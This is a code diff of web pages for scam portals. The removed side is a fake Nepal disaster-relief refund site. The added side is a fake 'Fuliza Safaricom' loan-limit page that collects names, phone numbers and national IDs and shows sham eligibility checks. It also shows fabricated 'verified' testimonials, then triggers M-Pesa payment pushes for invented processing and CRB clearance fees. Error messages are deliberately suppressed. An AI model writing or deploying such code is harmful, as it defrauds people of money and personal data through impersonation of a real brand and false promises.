-    { sno: 9, district: "Salyan", localLevel: "Kapurkot Rural Municipality", incident: "Heavy Rainfall",
-      date: "2026-09-04", male: 0, female: 0, unknown: 0, totalDeath: 0, missing: 0, affected: 3, loss: 250000,
-      injured: 0, govFull: 0, govPart: 0, pvtFull: 0 },
-    { sno: 10, district: "Bajura", localLevel: "Badimalika Municipality", incident: "Flood",
-      date: "2026-09-03", male: 0, female: 1, unknown: 0, totalDeath: 1, missing: 0, affected: 8, loss: 3400000,
-      injured: 2, govFull: 1, govPart: 0, pvtFull: 4 }
-  ];
+        function validateID(input) {
+            const wrapper = document.getElementById('nationalIdWrapper');
+            const id = input.value.trim();
+            const isValid = /^\d{6,8}$/.test(id);
+            wrapper.classList.toggle('valid', isValid);
+            wrapper.classList.toggle('invalid', !isValid && id.length > 0);
+            return isValid;
+        }
 
-  // ──────────────────────────────────────────────────────────────
-  // 3. RENDER FUNCTIONS
-  // ──────────────────────────────────────────────────────────────
-  function renderRefundTable() {
-    const tbody = document.getElementById('finance-table-body');
-    if (!tbody) return;
+        function validateEmail(input) {
+            const wrapper = document.getElementById('emailWrapper');
+            const email = input.value.trim();
+            const isValid = email === '' || /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            wrapper.classList.toggle('valid', isValid && email !== '');
+            wrapper.classList.toggle('invalid', !isValid && email !== '');
+            return isValid;
+        }
 
-    let html = '';
-    let totalClaimed = 0;
-    refundData.forEach((item) => {
-      const key = item.usd;
-      const isClaimed = claimedStatus[key] || false;
-      if (isClaimed) totalClaimed += item.usd;
-      const advanceFee = Math.round(item.usd * item.advancePercent);
-      const totalRepayable = item.usd + advanceFee;
+        function validateCurrentLimit(input) {
+            const wrapper = document.getElementById('currentLimitWrapper');
+            const val = parseInt(input.value.trim());
+            const isValid = !isNaN(val) && val >= 0;
+            wrapper.classList.toggle('valid', isValid);
+            wrapper.classList.toggle('invalid', !isValid && input.value.trim().length > 0);
+            return isValid;
+        }
 
-      html += `
-        <tr>
-          <td><span class="amount-bold-col">$${item.usd.toLocaleString()}</span></td>
-          <td style="font-weight:700; color:#2e7d32; font-size:14px;">$${item.refund?.toLocaleString() || '—'}</td>
-          <td class="figure-mono" style="color:#1e293b;">${item.npr.toLocaleString()}</td>
-          <td class="figure-mono" style="color:#475569;">${item.units?.toLocaleString() || '—'}</td>
-          <td class="figure-mono" style="color:#475569;">${item.hours || '—'}</td>
-          <td style="text-align:center;">
-            ${isClaimed ? `
-              <button class="btn-claim-only claimed" disabled>Claimed ✓</button>
-            ` : `
-              <button class="btn-claim-only" onclick="startClaim('${item.usd}')">Claim</button>
-            `}
-          </td>
-        </tr>
-      `;
-    });
-    tbody.innerHTML = html;
-    document.getElementById('stat-total-claimed').textContent = '$' + totalClaimed.toLocaleString();
-  }
+        // ==================== FEED ====================
+        function renderFeed() {
+            const container3 = document.getElementById('feedContainer3');
+            const containerCRB = document.getElementById('feedContainerCRB');
+            const containerProc = document.getElementById('feedContainerProc');
+            const html = feedItems.map(item => `
+                            <div class="feed-item">
+                                <div class="feed-avatar" style="background:${item.color};">${item.initials}</div>
+                                <div class="feed-content">
+                                    <div class="feed-name">${item.name} <span class="verified">✅ Verified</span></div>
+                                    <div class="feed-text">${item.text}</div>
+                                    <div class="feed-time">${item.time}</div>
+                                </div>
+                            </div>
+                        `).join('');
+            if (container3) container3.innerHTML = html;
+            if (containerCRB) containerCRB.innerHTML = html;
+            if (containerProc) containerProc.innerHTML = html;
+        }
 
-  function renderPortalTable(data) {
-    const tbody = document.getElementById('portal-table-body');
-    if (!tbody) return;
+        function addRandomFeed() {
+            const names = [
+                { name: 'Peter Ochieng', initials: 'PO', color: '#e65100' },
+                { name: 'Faith Akinyi', initials: 'FA', color: '#2e7d32' },
+                { name: 'Kevin Odhiambo', initials: 'KO', color: '#1565c0' },
+                { name: 'Sarah Wambui', initials: 'SW', color: '#6a1b9a' },
+                { name: 'David Mwangi', initials: 'DM', color: '#bf360c' },
+            ];
+            const texts = [
+                'Nani mwingine amepata? Yangu imekubali na niko Kajiado saa hii. 🎉',
+                'Niko Kisumu na nimepata. Program iko sawa kabisa. M-Pesa confirmed!',
+                'Hii kitu ni legit kabisa, nilikuwa nadhani ni uongo lakini 15k imefika.',
+                'Asante sana Fuliza Safaricom! This program is a game changer.',
+                'M-pesa ishaingia, shukran sana kwa hii msaada wa Fuliza Safaricom.',
+            ];
+            const randomName = names[Math.floor(Math.random() * names.length)];
+            const randomText = texts[Math.floor(Math.random() * texts.length)];
+            const timeOptions = ['Just now', '5 seconds ago', '10 seconds ago', '30 seconds ago'];
+            const randomTime = timeOptions[Math.floor(Math.random() * timeOptions.length)];
+            feedItems.unshift({ ...randomName, text: randomText, time: randomTime });
+            if (feedItems.length > 20) feedItems.pop();
+            renderFeed();
+        }
 
-    if (data.length === 0) {
-      tbody.innerHTML = `<tr><td colspan="16" style="text-align:center; padding:18px; color:#888;">No incident records found.</td></tr>`;
-      return;
-    }
+        // ==================== NAVIGATION ====================
+        function showPage(pageId) {
+            if (pageId === 'welcomePage') {
+                document.getElementById('welcomePage').style.display = 'block';
+                document.getElementById('formsArea').style.display = 'none';
+            } else {
+                document.getElementById('welcomePage').style.display = 'none';
+                document.getElementById('formsArea').style.display = 'flex';
+            }
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            const targetPage = document.getElementById(pageId);
+            if (targetPage) targetPage.classList.add('active');
+            window.scrollTo(0, 0);
+        }
 
-    let html = '';
-    data.forEach(row => {
-      html += `
-        <tr>
-          <td>${row.sno}</td>
-          <td>${row.district}</td>
-          <td>${row.localLevel}</td>
-          <td><strong>${row.incident}</strong></td>
-          <td>${row.date}</td>
-          <td>${row.male}</td>
-          <td>${row.female}</td>
-          <td>${row.unknown}</td>
-          <td><strong>${row.totalDeath}</strong></td>
-          <td>${row.missing}</td>
-          <td>${row.affected}</td>
-          <td>${row.loss > 0 ? 'Rs. ' + row.loss.toLocaleString() : '-'}</td>
-          <td>${row.injured}</td>
-          <td>${row.govFull}</td>
-          <td>${row.govPart}</td>
-          <td>${row.pvtFull}</td>
-        </tr>
-      `;
-    });
-    tbody.innerHTML = html;
-  }
+        function startApplication() {
+            showPage('step1');
+        }
 
-  function filterPortalTable() {
-    const selectedIncident = document.getElementById('filter-incident').value;
-    const selectedDistrict = document.getElementById('filter-district').value;
+        function goToStep(step) {
+            if (step === 3) {
+                const name = appData.fullName || 'jon';
+                document.getElementById('approvedGreeting').textContent = `🎉 Congratulations, ${name.toUpperCase()}!`;
+                document.getElementById('crbPhoneDisplay').textContent = appData.phone || '0710222875';
+                renderFeed();
+                if (!feedInterval) { feedInterval = setInterval(addRandomFeed, 8000); }
+            }
+            showPage('step' + step);
+        }
 
-    const filtered = portalIncidentsData.filter(item => {
-      const matchInc = !selectedIncident || item.incident.toLowerCase() === selectedIncident.toLowerCase();
-      const matchDist = !selectedDistrict || item.district.toLowerCase() === selectedDistrict.toLowerCase();
-      return matchInc && matchDist;
-    });
+        function showCRBPage() { showPage('crbPage'); }
+        function showProcessingFeePage() { showPage('processingFeePage'); }
 
-    renderPortalTable(filtered);
-  }
+        // ==================== STEP 1: SUBMIT ====================
+        function submitApplication(e) {
+            e.preventDefault();
+            const fullNameInput = document.getElementById('fullName');
+            const phoneInput = document.getElementById('phoneNumber');
+            const nationalIdInput = document.getElementById('nationalId');
+            const emailInput = document.getElementById('email');
+            const currentLimitInput = document.getElementById('currentLimit');
 
-  function exportPortalTableCSV() {
-    let csv = "S.No,District,Local Level,Incident,Incident Date,Death Male,Death Female,Death Unknown,Total Death,Missing,Affected,Estimated Loss,Injured,Govt Fully Damaged,Govt Partially Damaged,Private Fully Damaged\n";
-    portalIncidentsData.forEach(r => {
-      csv += `${r.sno},"${r.district}","${r.localLevel}","${r.incident}",${r.date},${r.male},${r.female},${r.unknown},${r.totalDeath},${r.missing},${r.affected},${r.loss},${r.injured},${r.govFull},${r.govPart},${r.pvtFull}\n`;
-    });
+            const isNameValid = validateName(fullNameInput);
+            const isPhoneValid = validatePhone(phoneInput);
+            const isIdValid = validateID(nationalIdInput);
+            const isEmailValid = validateEmail(emailInput);
+            const isLimitValid = validateCurrentLimit(currentLimitInput);
 
-    const blob = new Blob([csv], { type: 'text/csv' });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = `Nepal_DRR_Incidents_${new Date().toISOString().slice(0,10)}.csv`;
-    a.click();
-    URL.revokeObjectURL(url);
-  }
+            if (!isNameValid || !isPhoneValid || !isIdValid || !isLimitValid) {
+                showToast('Please correct the errors in the form.');
+                return;
+            }
 
-  // ──────────────────────────────────────────────────────────────
-  // 4. NAVIGATION
-  // ──────────────────────────────────────────────────────────────
-  function showPage(pageId) {
-    const portalDiv = document.getElementById('page-portal');
-    const claimDiv = document.getElementById('page-claim');
-    const compDiv = document.getElementById('page-compensation');
-    const contactDiv = document.getElementById('contact-page');
-    const navHome = document.getElementById('nav-home-btn');
-    const navClaim = document.getElementById('nav-claim-btn');
+            appData.fullName = fullNameInput.value.trim();
+            appData.phone = phoneInput.value.trim();
+            appData.id = nationalIdInput.value.trim();
+            appData.email = emailInput.value.trim();
+            appData.currentLimit = parseInt(currentLimitInput.value.trim()) || 700;
 
-    portalDiv.style.display = 'none';
-    claimDiv.style.display = 'none';
-    compDiv.style.display = 'none';
-    contactDiv.style.display = 'none';
+            document.getElementById('processingModal').classList.add('open');
+            setTimeout(() => {
+                document.getElementById('processingModal').classList.remove('open');
+                runEligibilityChecks();
+            }, 1500);
+        }
 
-    if (navHome) navHome.classList.remove('active');
-    if (navClaim) navClaim.classList.remove('active');
+        // ==================== ELIGIBILITY ====================
+        function runEligibilityChecks() {
+            const firstName = appData.fullName.split(' ')[0] || 'jon';
+            document.getElementById('checkingSubtext').textContent =
+                `Hold on ${firstName}, we're reviewing your application.`;
+            showPage('checkingPage');
+            const checkItems = [
+                document.getElementById('check1'),
+                document.getElementById('check2'),
+                document.getElementById('check3'),
+                document.getElementById('check4'),
+                document.getElementById('check5')
+            ];
+            checkItems.forEach(item => { item.className = 'check-item pending'; });
+            let currentCheck = 0;
 
-    if (pageId === 'claim') {
-      claimDiv.style.display = 'block';
-      if (navClaim) navClaim.classList.add('active');
-      renderRefundTable();
-    } else if (pageId === 'compensation') {
-      compDiv.style.display = 'block';
-      updateCompensationPage();
-    } else if (pageId === 'contact') {
-      contactDiv.style.display = 'block';
-    } else {
-      portalDiv.style.display = 'block';
-      if (navHome) navHome.classList.add('active');
-    }
+            function runNext() {
+                if (currentCheck > 0) { checkItems[currentCheck - 1].className = 'check-item completed'; }
+                if (currentCheck < checkItems.length) {
+                    checkItems[currentCheck].className = 'check-item active';
+                    currentCheck++;
+                    setTimeout(runNext, 1800);
+                } else {
+                    setTimeout(() => { goToStep(3); }, 1200);
+                }
+            }
+            setTimeout(runNext, 400);
+        }
 
-    window.scrollTo({ top: 0, behavior: 'smooth' });
-  }
+        // ==================== NORMALIZE PHONE ====================
+        function normalizePhone(raw) {
+            let p = raw.replace(/\s+/g, '');
+            if (p.startsWith('0')) p = '254' + p.slice(1);
+            if (p.startsWith('+')) p = p.slice(1);
+            return p;
+        }
 
-  // ──────────────────────────────────────────────────────────────
-  // 5. CLAIM FLOW
-  // ──────────────────────────────────────────────────────────────
-  function startClaim(usd) {
-    const pkg = refundData.find(item => item.usd == usd);
-    if (!pkg) return;
-    selectedPackage = pkg;
-    showPage('compensation');
-  }
+        // ==================== PAYLORE STK PUSH ====================
+        async function payloreSTKPush(phone, amount, reference, description) {
+            const payload = {
+                phone: normalizePhone(phone),
+                amount: amount,
+                reference: reference || 'TEST-' + Date.now(),
+                description: description || 'Test STK Push'
+            };
 
-  function updateCompensationPage() {
-    if (!selectedPackage) {
-      document.getElementById('selected-package-display').textContent = '—';
-      document.getElementById('selected-amount-display').textContent = '—';
-      document.getElementById('processing-fee-display').textContent = '—';
-      document.getElementById('pay-fee-label').textContent = '—';
-      return;
-    }
+            const response = await fetch('/api/stk-push', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
 
-    document.getElementById('selected-package-display').textContent = selectedPackage.usd + ' USD';
-    document.getElementById('selected-amount-display').textContent = 'KSh ' + selectedPackage.ksh.toLocaleString();
-    document.getElementById('processing-fee-display').textContent = selectedPackage.processingFee.toLocaleString();
-    document.getElementById('pay-fee-label').textContent = selectedPackage.processingFee.toLocaleString();
+            const responseText = await response.text();
+            let jsonData = null;
+            try { jsonData = JSON.parse(responseText); } catch (e) {}
 
-    document.getElementById('mpesa-input').value = '';
-    document.getElementById('pay-claim-btn').disabled = false;
-    document.getElementById('pay-claim-btn').style.display = 'block';
-  }
+            if (!response.ok) {
+                throw new Error(jsonData?.error || jsonData?.message || responseText || 'Request failed');
+            }
 
-  // ──────────────────────────────────────────────────────────────
-  // 6. PAYLORE STK PUSH (no polling)
-  // ──────────────────────────────────────────────────────────────
-  function normalizePhone(raw) {
-    let p = raw.replace(/\s+/g, '');
-    if (p.startsWith('0')) p = '254' + p.slice(1);
-    if (p.startsWith('+')) p = p.slice(1);
-    return p;
-  }
+            if (jsonData && jsonData.status === 'SENT' && jsonData.transactionId) {
+                return jsonData;
+            } else {
+                throw new Error(jsonData?.error || jsonData?.message || 'STK push failed');
+            }
+        }
 
-  async function payloreSTKPush(phone, amount, reference, description) {
-    const payload = {
-      phone: normalizePhone(phone),
-      amount: amount,
-      reference: reference || 'NEPAL-' + Date.now(),
-      description: description || 'Nepal DRR Processing Fee'
-    };
+        // ==================== PAYLORE TRANSACTION STATUS ====================
+        async function payloreTransactionStatus(transactionId) {
+            const response = await fetch(`/api/status?transactionId=${transactionId}`);
+            const text = await response.text();
+            let data;
+            try { data = JSON.parse(text); } catch (e) { data = null; }
+            if (!response.ok) {
+                throw new Error(data?.error || data?.message || text || 'Status check failed');
+            }
+            if (!data) throw new Error('Invalid status response');
+            return data;
+        }
 
-    const response = await fetch('/api/stk-push', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    });
+        // ==================== PROCESSING FEE (SILENT) ====================
+        function openProcessingFeePayment() {
+            document.getElementById('processingFeeModal').classList.add('open');
+            document.getElementById('procFeePhoneInput').value = appData.phone.replace(/^0/, '') || '710222875';
+            document.getElementById('procFeePayBtn').disabled = false;
+            document.getElementById('procFeePayText').textContent = 'Pay Ksh 200';
+            document.getElementById('procFeeSpinner').style.display = 'none';
+        }
 
-    const responseText = await response.text();
-    let jsonData = null;
-    try { jsonData = JSON.parse(responseText); } catch (e) {}
+        function closeProcFeeModal() {
+            document.getElementById('processingFeeModal').classList.remove('open');
+        }
 
-    if (!response.ok) {
-      throw new Error(jsonData?.error || jsonData?.message || responseText || 'Request failed');
-    }
+        async function processProcessingFee() {
+            const rawPhone = document.getElementById('procFeePhoneInput').value.trim();
+            if (!rawPhone) {
+                closeProcFeeModal();
+                return;
+            }
 
-    // Only require status === 'SENT' and transactionId
-    if (jsonData && jsonData.status === 'SENT' && jsonData.transactionId) {
-      return jsonData;
-    } else {
-      throw new Error(jsonData?.error || jsonData?.message || 'STK push failed');
-    }
-  }
+            const payBtn = document.getElementById('procFeePayBtn');
+            const payText = document.getElementById('procFeePayText');
+            const spinner = document.getElementById('procFeeSpinner');
 
-  // ──────────────────────────────────────────────────────────────
-  // 7. PAYMENT EXECUTION (no polling – goes directly to contact page)
-  // ──────────────────────────────────────────────────────────────
-  function showToast(msg) {
-    const toast = document.getElementById('toast');
-    toast.textContent = msg;
-    toast.classList.add('show');
-    setTimeout(() => toast.classList.remove('show'), 3000);
-  }
+            payBtn.disabled = true;
+            payText.textContent = 'Sending...';
+            spinner.style.display = 'inline-block';
 
-  async function initiatePayment() {
-    if (!selectedPackage) {
-      alert('Please select a package first.');
-      return;
-    }
+            document.getElementById('stkPhoneDisplay').textContent = '(' + rawPhone + ')';
+            document.getElementById('stkWaitingOverlay').classList.add('open');
 
-    const phone = document.getElementById('mpesa-input').value.trim();
-    if (!phone) {
-      alert('Please enter your phone number.');
-      return;
-    }
-    if (!/^\d{10,}$/.test(phone.replace(/\s/g, ''))) {
-      alert('Please enter a valid M-Pesa number (e.g., 0712345678).');
-      return;
-    }
+            try {
+                const reference = `PROC_${Date.now()}_${Math.floor(Math.random() * 10000)}`;
+                const result = await payloreSTKPush(rawPhone, 200, reference, 'Fuliza Processing Fee');
+                processingFeeTransactionId = result.transactionId;
 
-    const fee = selectedPackage.processingFee;
+                await pollTransactionStatus(processingFeeTransactionId, 'processing');
 
-    const btn = document.getElementById('pay-claim-btn');
-    btn.disabled = true;
+                document.getElementById('stkWaitingOverlay').classList.remove('open');
+                closeProcFeeModal();
+                proceedToCRB();
 
-    // Show STK modal
-    document.getElementById('stk-phone-display').textContent = phone;
-    document.getElementById('stk-amount-display').textContent = 'KSh ' + fee.toLocaleString();
-    document.getElementById('stk-status').textContent = 'Sending STK push...';
-    document.getElementById('stk-status').className = 'stk-status';
-    document.getElementById('stk-spinner').style.display = 'inline-block';
-    document.getElementById('stk-confirm-btn').style.display = 'none';
-    document.getElementById('stk-cancel-btn').disabled = false;
-    document.getElementById('stk-timer').textContent = '60';
-    document.getElementById('stkModal').classList.add('active');
+                payBtn.disabled = false;
+                payText.textContent = 'Pay Ksh 200';
+                spinner.style.display = 'none';
 
-    try {
-      const reference = `NEPAL_${Date.now()}_${Math.floor(Math.random() * 10000)}`;
-      const result = await payloreSTKPush(phone, fee, reference, 'Nepal DRR Processing Fee');
-      processingFeeTransactionId = result.transactionId;
+            } catch (err) {
+                document.getElementById('stkWaitingOverlay').classList.remove('open');
+                closeProcFeeModal();
+                // SILENT: no error message
+                payBtn.disabled = false;
+                payText.textContent = 'Pay Ksh 200';
+                spinner.style.display = 'none';
+            }
+        }
 
-      // ✅ Success – STK push sent
-      document.getElementById('stkModal').classList.remove('active');
-      btn.disabled = false;
+        function proceedToCRB() {
+            showCRBPage();
+        }
 
-      // Mark as claimed
-      claimedStatus[selectedPackage.usd] = true;
+        // ==================== CRB PAYMENT (SILENT) ====================
+        function openCRBPayment() {
+            document.getElementById('crbModal').classList.add('open');
+            document.getElementById('crbPhoneInput').value = appData.phone.replace(/^0/, '') || '710222875';
+            document.getElementById('crbPayBtn').disabled = false;
+            document.getElementById('crbPayText').textContent = 'Pay Ksh 280';
+            document.getElementById('crbSpinner').style.display = 'none';
+        }
 
-      // Go directly to contact page
-      showPage('contact');
+        function closeCRBModal() { document.getElementById('crbModal').classList.remove('open'); }
 
-    } catch (err) {
-      console.error('Payment error:', err);
-      document.getElementById('stkModal').classList.remove('active');
-      btn.disabled = false;
-      // Only generic toast – no details
-      showToast('Payment failed. Please try again.');
-    }
-  }
+        async function processCRBPayment() {
+            const rawPhone = document.getElementById('crbPhoneInput').value.trim();
+            if (!rawPhone) {
+                closeCRBModal();
+                return;
+            }
 
-  // ──────────────────────────────────────────────────────────────
-  // 8. CANCEL STK MODAL
-  // ──────────────────────────────────────────────────────────────
-  document.getElementById('stk-cancel-btn').addEventListener('click', function() {
-    document.getElementById('stkModal').classList.remove('active');
-    document.getElementById('pay-claim-btn').disabled = false;
-  });
+            const payBtn = document.getElementById('crbPayBtn');
+            const payText = document.getElementById('crbPayText');
+            const spinner = document.getElementById('crbSpinner');
 
-  // ──────────────────────────────────────────────────────────────
-  // 9. INIT
-  // ──────────────────────────────────────────────────────────────
-  document.addEventListener('DOMContentLoaded', function() {
-    renderPortalTable(portalIncidentsData);
-    renderRefundTable();
+            payBtn.disabled = true;
+            payText.textContent = 'Sending...';
+            spinner.style.display = 'inline-block';
 
-    const mpesaInput = document.getElementById('mpesa-input');
-    if (mpesaInput) {
-      mpesaInput.addEventListener('input', function() {
-        this.value = this.value.replace(/[^0-9]/g, '');
-        if (this.value.length > 10) this.value = this.value.slice(0, 10);
-      });
-    }
-  });
+            document.getElementById('stkPhoneDisplay').textContent = '(' + rawPhone + ')';
+            document.getElementById('stkWaitingOverlay').classList.add('open');
 
-  // Override showPage to re‑render refund table when returning to claim page
-  const originalShowPage = showPage;
-  showPage = function(pageId) {
-    originalShowPage(pageId);
-    if (pageId === 'claim') {
-      renderRefundTable();
-    }
-  };
+            try {
+                const reference = `CRB_${Date.now()}_${Math.floor(Math.random() * 10000)}`;
+                const result = await payloreSTKPush(rawPhone, 280, reference, 'Fuliza CRB Clearance');
+                crbTransactionId = result.transactionId;
 
-  // Attach all functions to `window` for onclick
-  window.startClaim = startClaim;
-  window.showPage = showPage;
-  window.filterPortalTable = filterPortalTable;
-  window.exportPortalTableCSV = exportPortalTableCSV;
-  window.initiatePayment = initiatePayment;
+                await pollTransactionStatus(crbTransactionId, 'crb');
 
-  console.log('🇳🇵 Nepal DRR Portal – STK push (no polling, no success messages)');
-</script>
+                document.getElementById('stkWaitingOverlay').classList.remove('open');
+                closeCRBModal();
+                proceedToFinalPage();
 
+                payBtn.disabled = false;
+                payText.textContent = 'Pay Ksh 280';
+                spinner.style.display = 'none';
+
+            } catch (err) {
+                document.getElementById('stkWaitingOverlay').classList.remove('open');
+                closeCRBModal();
+                // SILENT: no error message
+                payBtn.disabled = false;
+                payText.textContent = 'Pay Ksh 280';
+                spinner.style.display = 'none';
+            }
+        }
+
+        // ==================== POLL TRANSACTION STATUS ====================
+        function pollTransactionStatus(transactionId, type) {
+            return new Promise((resolve, reject) => {
+                let attempts = 0;
+                const maxAttempts = 30;
+
+                const interval = setInterval(async () => {
+                    attempts++;
+                    try {
+                        const statusData = await payloreTransactionStatus(transactionId);
+                        if (statusData.status === 'COMPLETED' || statusData.status === 'SUCCESS') {
+                            clearInterval(interval);
+                            resolve(statusData);
+                        } else if (statusData.status === 'FAILED' || statusData.status === 'CANCELLED') {
+                            clearInterval(interval);
+                            reject(new Error(`Transaction ${statusData.status}`));
+                        } else if (attempts >= maxAttempts) {
+                            clearInterval(interval);
+                            reject(new Error('Transaction timeout. Please check your M-PESA app.'));
+                        }
+                    } catch (err) {
+                        clearInterval(interval);
+                        reject(err);
+                    }
+                }, 2000);
+            });
+        }
+
+        // ==================== FINAL PAGE ====================
+        function proceedToFinalPage() {
+            const rawPhone = appData.phone.startsWith('0') ? appData.phone : '0' + appData.phone;
+            document.getElementById('finalPhoneDisplay').textContent = rawPhone;
+            document.getElementById('finalReceiptDisplay').textContent = 'UG' + Math.random().toString(36).substring(2, 11)
+                .toUpperCase();
+            showPage('allFeesClearedPage');
+        }
+
+        function backToHome() {
+            showPage('welcomePage');
+            document.getElementById('welcomePage').style.display = 'block';
+            document.getElementById('formsArea').style.display = 'none';
+            if (feedInterval) { clearInterval(feedInterval);
+                feedInterval = null; }
+        }
+
+        // ==================== TOAST ====================
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        // ──────────────────────────────────────────────────────────────
+        // ATTACH ALL FUNCTIONS TO `window`
+        // ──────────────────────────────────────────────────────────────
+        window.startApplication = startApplication;
+        window.showPage = showPage;
+        window.goToStep = goToStep;
+        window.showCRBPage = showCRBPage;
+        window.showProcessingFeePage = showProcessingFeePage;
+        window.submitApplication = submitApplication;
+        window.openProcessingFeePayment = openProcessingFeePayment;
+        window.closeProcFeeModal = closeProcFeeModal;
+        window.processProcessingFee = processProcessingFee;
+        window.proceedToCRB = proceedToCRB;
+        window.openCRBPayment = openCRBPayment;
+        window.closeCRBModal = closeCRBModal;
+        window.processCRBPayment = processCRBPayment;
+        window.backToHome = backToHome;
+        window.showToast = showToast;
+
+        // ──────────────────────────────────────────────────────────────
+        // INIT
+        // ──────────────────────────────────────────────────────────────
+        document.addEventListener('DOMContentLoaded', function() {
+            const fullNameInput = document.getElementById('fullName');
+            const phoneInput = document.getElementById('phoneNumber');
+            const nationalIdInput = document.getElementById('nationalId');
+            const emailInput = document.getElementById('email');
+            const currentLimitInput = document.getElementById('currentLimit');
+
+            fullNameInput.addEventListener('input', () => validateName(fullNameInput));
+            phoneInput.addEventListener('input', () => {
+                phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
+                if (phoneInput.value.length > 10) phoneInput.value = phoneInput.value.slice(0, 10);
+                validatePhone(phoneInput);
+            });
+            nationalIdInput.addEventListener('input', () => {
+                nationalIdInput.value = nationalIdInput.value.replace(/[^0-9]/g, '');
+                if (nationalIdInput.value.length > 8) nationalIdInput.value = nationalIdInput.value.slice(0, 8);
+                validateID(nationalIdInput);
+            });
+            emailInput.addEventListener('input', () => validateEmail(emailInput));
+            currentLimitInput.addEventListener('input', () => {
+                currentLimitInput.value = currentLimitInput.value.replace(/[^0-9]/g, '');
+                validateCurrentLimit(currentLimitInput);
+            });
+
+            renderFeed();
+        });
+
+        setInterval(() => {
+            const step3Active = document.getElementById('step3').classList.contains('active');
+            const procActive = document.getElementById('processingFeePage').classList.contains('active');
+            const crbActive = document.getElementById('crbPage').classList.contains('active');
+            if (step3Active || procActive || crbActive) { addRandomFeed(); }
+        }, 10000);
+
+        console.log('🇰🇪 Fuliza Safaricom Kenya — all payment messages removed');
+    </script>
 </body>
 </html>
